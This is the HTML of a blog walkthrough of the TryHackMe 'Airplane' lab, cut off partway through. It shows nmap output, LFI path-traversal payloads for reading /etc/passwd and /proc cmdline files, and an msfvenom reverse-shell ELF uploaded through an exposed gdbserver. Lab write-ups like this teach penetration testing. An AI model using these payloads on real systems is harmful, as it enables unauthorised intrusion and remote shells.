@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Platform: TryHackMe Link: Airplane Level: Medium OS: Linux The challenge Airplane begins by uncovering a Local File Inclusion (LFI) vulnerability. By exploiting it, we enumerate the target’s running processes and identify one linked to GdbServer. Using an ELF binary crafted with msfvenom, we exploit this tool to gain an initial foothold on the system. Further enumeration reveals a binary with the SUID bit set, enabling us to pivot to another user and retrieve the user flag." />
+<meta name="keywords" content="technology, programming, tutorials, cybersecurity, software engineering, machine learning, hands-on projects, writeups, TryHackMe" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://scorpiosec.com/posts/2024/12/thm-airplane/" />
+
+
+    <title>
+        
+            THM: Airplane
+        
+    </title>
+
+
+
+
+
+
+<link rel="stylesheet" href="https://scorpiosec.com/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://scorpiosec.com/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://scorpiosec.com/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://scorpiosec.com/favicon-16x16.png">
+    <link rel="manifest" href="https://scorpiosec.com/site.webmanifest">
+    <link rel="mask-icon" href="https://scorpiosec.com/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://scorpiosec.com/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="THM: Airplane">
+<meta itemprop="description" content="Platform: TryHackMe Link: Airplane Level: Medium OS: Linux The challenge Airplane begins by uncovering a Local File Inclusion (LFI) vulnerability. By exploiting it, we enumerate the target’s running processes and identify one linked to GdbServer. Using an ELF binary crafted with msfvenom, we exploit this tool to gain an initial foothold on the system. Further enumeration reveals a binary with the SUID bit set, enabling us to pivot to another user and retrieve the user flag."><meta itemprop="datePublished" content="2024-12-11T17:41:30-06:00" />
+<meta itemprop="dateModified" content="2024-12-11T17:41:30-06:00" />
+<meta itemprop="wordCount" content="1287"><meta itemprop="image" content="https://scorpiosec.com/images/THM-Airplane/Airplane.svg" />
+<meta itemprop="keywords" content="TryHackMe," />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://scorpiosec.com/images/THM-Airplane/Airplane.svg" /><meta name="twitter:title" content="THM: Airplane"/>
+<meta name="twitter:description" content="Platform: TryHackMe Link: Airplane Level: Medium OS: Linux The challenge Airplane begins by uncovering a Local File Inclusion (LFI) vulnerability. By exploiting it, we enumerate the target’s running processes and identify one linked to GdbServer. Using an ELF binary crafted with msfvenom, we exploit this tool to gain an initial foothold on the system. Further enumeration reveals a binary with the SUID bit set, enabling us to pivot to another user and retrieve the user flag."/>
+
+
+
+    <meta property="og:title" content="THM: Airplane" />
+<meta property="og:description" content="Platform: TryHackMe Link: Airplane Level: Medium OS: Linux The challenge Airplane begins by uncovering a Local File Inclusion (LFI) vulnerability. By exploiting it, we enumerate the target’s running processes and identify one linked to GdbServer. Using an ELF binary crafted with msfvenom, we exploit this tool to gain an initial foothold on the system. Further enumeration reveals a binary with the SUID bit set, enabling us to pivot to another user and retrieve the user flag." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://scorpiosec.com/posts/2024/12/thm-airplane/" /><meta property="og:image" content="https://scorpiosec.com/images/THM-Airplane/Airplane.svg" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-12-11T17:41:30-06:00" />
+<meta property="article:modified_time" content="2024-12-11T17:41:30-06:00" />
+
+
+
+
+
+    <meta property="article:section" content="Writeups" />
+
+
+
+    <meta property="article:published_time" content="2024-12-11 17:41:30 -0600 CST" />
+
+
+
+
+
+
+
+
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-662ME9PQBT"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-662ME9PQBT', { 'anonymize_ip': false });
+}
+</script>
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://scorpiosec.com/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                Scorpiosec:~$</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://scorpiosec.com/about/">About</a></li><li><a href="https://scorpiosec.com/posts/">Posts</a></li><li><a href="https://scorpiosec.com/projects/">Projects</a></li><li><a href="https://scorpiosec.com/tags/">Tags</a></li><li><a href="https://scorpiosec.com/categories/">Categories</a></li>
+        <div class="submenu">
+            <li class="dropdown">
+                <a href="javascript:void(0)" class="dropbtn">en</a>
+                <div class="dropdown-content">
+                    
+                        
+                            <a title="fr" href="https://scorpiosec.com/fr/posts/2024/12/thm-airplane/">fr</a>
+                        
+                    
+                </div>
+            </li>
+        </div>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        7 minutes
+
+         | Also available in
+          
+              <a href="https://scorpiosec.com/fr/posts/2024/12/thm-airplane/"><span class="flag fi fi-fr"></span></a>
+          
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://scorpiosec.com/posts/2024/12/thm-airplane/">THM: Airplane</a>
+      </h1>
+
+      
+
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table of Contents</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#scanning">Scanning</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#initial-foothold-shell-as-hudson">Initial Foothold (shell as hudson)</a>
+      <ul>
+        <li><a href="#lateral-movement-shell-as-carlos">Lateral Movement (shell as carlos)</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        <ul>
+<li>Platform: TryHackMe</li>
+<li>Link: <a href="https://tryhackme.com/r/room/airplane" target="_blank" >Airplane</a>
+
+</li>
+<li>Level: Medium</li>
+<li>OS: Linux</li>
+</ul>
+<hr>
+<p>The challenge Airplane begins by uncovering a Local File Inclusion (LFI) vulnerability. By exploiting it, we enumerate the target’s running processes and identify one linked to <code>GdbServer</code>. Using an ELF binary crafted with msfvenom, we exploit this tool to gain an initial foothold on the system. Further enumeration reveals a binary with the SUID bit set, enabling us to pivot to another user and retrieve the user flag. We then access the system via SSH as the new user and discover permissions to execute Ruby scripts as the root user. By creating and running a malicious Ruby script, we escalate privileges and obtain root access.</p>
+<h2 id="scanning">Scanning</h2>
+<pre tabindex="0"><code>./nmap_scan.sh 10.10.14.32 Airplane
+</code></pre><p><strong>Results</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Running detailed scan on open ports: 22,6048,8000
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-12-11 17:48 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.14.32
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.21s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>6048/tcp open  x11?
+</span></span><span style="display:flex;"><span>8000/tcp open  http-alt Werkzeug/3.0.2 Python/3.8.10
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://airplane.thm:8000/?page<span style="color:#f92672">=</span>index.html
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   FourOhFourRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">404</span> NOT FOUND
+</span></span><span style="display:flex;"><span>|     Server: Werkzeug/3.0.2 Python/3.8.10
+</span></span><span style="display:flex;"><span>|     Date: Wed, <span style="color:#ae81ff">11</span> Dec <span style="color:#ae81ff">2024</span> 23:48:23 GMT
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">207</span>
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     &lt;!doctype html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html lang<span style="color:#f92672">=</span>en&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;404 Not Found&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Not Found&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|   GetRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">302</span> FOUND
+</span></span><span style="display:flex;"><span>|     Server: Werkzeug/3.0.2 Python/3.8.10
+</span></span><span style="display:flex;"><span>|     Date: Wed, <span style="color:#ae81ff">11</span> Dec <span style="color:#ae81ff">2024</span> 23:48:17 GMT
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">269</span>
+</span></span><span style="display:flex;"><span>|     Location: http://airplane.thm:8000/?page<span style="color:#f92672">=</span>index.html
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     &lt;!doctype html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html lang<span style="color:#f92672">=</span>en&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;Redirecting...&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Redirecting...&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://airplane.thm:8000/?page=index.html&#34;</span>&gt;http://airplane.thm:8000/?page<span style="color:#f92672">=</span>index.html&lt;/a&gt;. If not, click the link.
+</span></span><span style="display:flex;"><span>|   Socks5: 
+</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD HTML 4.01//EN&#34;</span>
+</span></span><span style="display:flex;"><span>|     <span style="color:#e6db74">&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html;charset=utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;Error response&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;body&gt;
+</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Error response&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;Error code: 400&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;Message: Bad request syntax <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &#39;</span><span style="color:#f92672">)</span>.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/body&gt;
+</span></span><span style="display:flex;"><span>|_    &lt;/html&gt;
+</span></span><span style="display:flex;"><span>|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port8000-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>12/11%Time<span style="color:#f92672">=</span>675A24C2%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%
+</span></span><span style="display:flex;"><span>SF:r<span style="color:#f92672">(</span>GetRequest,1F3,<span style="color:#e6db74">&#34;HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/3\.0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\.2\x20Python/3\.8\.10\r\nDate:\x20Wed,\x2011\x20Dec\x202024\x2023:48:1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:7\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Len
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:gth:\x20269\r\nLocation:\x20http://airplane\.thm:8000/\?page=index\.htm
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:l\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20lang=en&gt;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:n&lt;title&gt;Redirecting\.\.\.&lt;/title&gt;\n&lt;h1&gt;Redirecting\.\.\.&lt;/h1&gt;\n&lt;p&gt;You\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20should\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0URL:\x20&lt;a\x20href=\&#34;http://airplane\.thm:8000/\?page=index\.html\&#34;&gt;ht
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:tp://airplane\.thm:8000/\?page=index\.html&lt;/a&gt;\.\x20If\x20not,\x20click
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20the\x20link\.\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>FourOhFourRequest,184,<span style="color:#e6db74">&#34;HTTP/1\.1\x20404\x20NOT\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20FOUND\r\nServer:\x20Werkzeug/3\.0\.2\x20Python/3\.8\.10\r\nDate:\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Wed,\x2011\x20Dec\x202024\x2023:48:23\x20GMT\r\nContent-Type:\x20text/h
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:tml;\x20charset=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20lang=en&gt;\n&lt;title&gt;404\x20Not\x20Fou
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:nd&lt;/title&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;\n&lt;p&gt;The\x20requested\x20URL\x20was\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0not\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20URL\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20again\.&lt;/p&gt;\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Socks5,213,<span style="color:#e6db74">&#34;&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&#34;-//W3
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:C//DTD\x20HTML\x204\.01//EN\&#34;\n\x20\x20\x20\x20\x20\x20\x20\x20\&#34;http:/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:/www\.w3\.org/TR/html4/strict\.dtd\&#34;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head&gt;\n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&#34;Content-Type\&#34;\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0content=\&#34;text/html;charset=utf-8\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20response&lt;/h1&gt;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\n\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20syntax\x20\(&#39;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x05\\x04\\x00\\x01\\x02\\x80\\x05\\x01\\x00\\x03&#39;\)\.&lt;/p&gt;\n\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code\x20explanation:\x20HTTPStatus\.BA
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:D_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20meth
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:od\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 181.28 seconds
+</span></span></code></pre></div><p>Our nmap scan discover three open ports:</p>
+<ul>
+<li>22 - SSH</li>
+<li>6048 - nmap is not able to accurately determine the service on this port</li>
+<li>8000 - A web server with Python Werkzeug. We also have a redirection to <code>airplane.thm</code> which we add to the <code>/etc/hosts</code> file.</li>
+</ul>
+<h2 id="enumeration">Enumeration</h2>
+<p>Browsing to the website lead us to <code>http://airplane.thm:8000/?page=index.html</code> where we find a static website with various information about airplanes. We also note the presence of <code>?page=index.html</code> possibly pointing to an LFI vulnerability if security controls are lacking.</p>
+<p><img src="https://scorpiosec.com/images/THM-Airplane/airplane_website.png" alt="Airplane website"></p>
+<p>In Burp we confirm the presence of the LFI vulnerability.</p>
+<p><img src="https://scorpiosec.com/images/THM-Airplane/LFI_confirmed.png" alt="LFI confirmed"></p>
+<p>We can read the <code>/etc/passwd</code> to find out the users on the target system.</p>
+<p><img src="https://scorpiosec.com/images/THM-Airplane/users_list.png" alt="user accounts"></p>
+<p>Here is the full content of the <code>/etc/passwd</code> file, we notice two user accounts <code>carlos</code> and <code>hudson</code>.</p>
+<pre tabindex="0"><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
+nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
+whoopsie:x:120:125::/nonexistent:/bin/false
+colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+fwupd-refresh:x:122:127:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+geoclue:x:123:128::/var/lib/geoclue:/usr/sbin/nologin
+pulse:x:124:129:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
+gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
+sssd:x:127:132:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
+carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+hudson:x:1001:1001::/home/hudson:/bin/bash
+sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
+</code></pre><p>Trying to read the <code>user.txt</code> file in the home folder of <code>carlos</code> or <code>hudson</code> fails.</p>
+<p><img src="https://scorpiosec.com/images/THM-Airplane/carlos_home_folder.png" alt="carlos Home folder"></p>
+<p><img src="https://scorpiosec.com/images/THM-Airplane/hudson_home_folder.png" alt="hudson home fodler"></p>
+<p>Let&rsquo;s continue our enumeration with some directory bruteforcing.</p>
+<p><img src="https://scorpiosec.com/images/THM-Airplane/gobuster_cmd.png" alt="directory bruteforcing with Gobuster"></p>
+<p>At <code>http://airplane.thm:8000/airplane</code> we find an animation with the message &ldquo;Let&rsquo;s Fly&rdquo;, this is probably not a viable exploitation path. Additionally, the subdomain enumeration does not give any results.</p>
+<p><img src="https://scorpiosec.com/images/THM-Airplane/letsfly.png" alt="airplane directory"></p>
+<p>We can leverage the LFI vulnerability to find information about the processes running on the target. Each process running on a Linux system has a corresponding directory under the <code>/proc</code> filesystem, and within that directory there is a file named <code>cmdline</code>.</p>
+<p>For example <code>/proc/100/cmdline</code> will contain the command-line arguments that were used to start the process with PID <code>100</code>. These file can contain sensitive information such as passwords, API keys, etc.</p>
+<p>In order to enumerate the processes on the target, we use the Intruder feature in Burp. We use the payload <code>../../../../proc/x/cmdline</code> with the section sign around the <code>x</code>.</p>
+<p><img src="https://scorpiosec.com/images/THM-Airplane/payload_intruder.png" alt="payload in intruder"></p>
+<p>For the payload settings we select <code>Numbers</code> going sequentially from 1 to 10000 (You can pick a smaller number like 1000) and start the attack. Because of the rate limit in Burp CE, the process will take a long time but we can continue our enumeration as the attack progresses.</p>
+<blockquote>
+<p>I recommend using <a href="https://caido.io/" target="_blank" >Caido</a>
+
+ for this type of attack because it does not have the rate limit issue.</p>
+</blockquote>
+<p>After sorting by length, you will find a request with the response being <code>/usr/bin/gdbserver0.0.0.0:6048airplane</code>. (The specific request is always found among those with a length of approximately 400 bytes)</p>
+<p><img src="https://scorpiosec.com/images/THM-Airplane/gdbserver.png" alt="gdbserver process"></p>
+<h2 id="initial-foothold-shell-as-hudson">Initial Foothold (shell as hudson)</h2>
+<p>Searching <code>gdbserver reverse shell</code> on Google, we find <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver" target="_blank" >this HackTricks page</a>
+
+ explaining how to exploit this tool. Let&rsquo;s follow the steps:</p>
+<ol>
+<li>Create an elf backdoor</li>
+</ol>
+<pre tabindex="0"><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP_ADDRESS LPORT=PORT PrependFork=true -f elf -o binary.elf
+</code></pre><p><img src="https://scorpiosec.com/images/THM-Airplane/elf_backdoor.png" alt="elf backdoor"></p>
+<ol start="2">
+<li>Make it executable</li>
+</ol>
+<pre tabindex="0"><code>chmod +x binary.elf
+</code></pre><ol start="3">
+<li>Launch GDB to debug the executable</li>
+</ol>
+<pre tabindex="0"><code>gdb binary.elf
+</code></pre><p><img src="https://scorpiosec.com/images/THM-Airplane/gdb_elf.png" alt="Open the elf with GDB"></p>
+<ol start="4">
+<li>Set the remote debuger target</li>
+</ol>
+<pre tabindex="0"><code>target extended-remote airplane.thm:6048
+</code></pre><p><img src="https://scorpiosec.com/images/THM-Airplane/elf_target_set.png" alt="Set the remote target"></p>
+<ol start="5">
+<li>Upload the elf file</li>
+</ol>
+<pre tabindex="0"><code>remote put binary.elf /tmp/binary.elf
+</code></pre><p><img src="https://scorpiosec.com/images/THM-Airplane/elf_upload.png" alt="elf backdoor upload"></p>
+<ol start="6">
+<li>Set the remote executable file</li>
+</ol>
+<pre tabindex="0"><code>set remote exec-file /tmp/binary.elf
+</code></pre><ol start="7">
